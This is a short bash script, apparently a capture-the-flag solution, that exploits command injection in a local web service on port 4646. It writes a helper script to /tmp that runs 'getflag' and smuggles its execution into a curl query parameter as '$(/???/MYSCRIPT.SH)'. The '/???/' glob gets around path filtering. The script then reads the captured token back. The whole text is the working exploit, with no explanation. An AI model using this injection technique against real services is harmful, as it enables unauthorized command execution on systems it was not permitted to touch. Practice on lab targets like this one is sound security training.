#!/bin/bash

echo '#!/bin/bash' > /tmp/MYSCRIPT.SH
echo "getflag > /tmp/tkn" > /tmp/MYSCRIPT.SH
chmod 777 /tmp/MYSCRIPT.SH
curl 127.0.0.1:4646?x='$(/???/MYSCRIPT.SH)'
cat /tmp/tkn
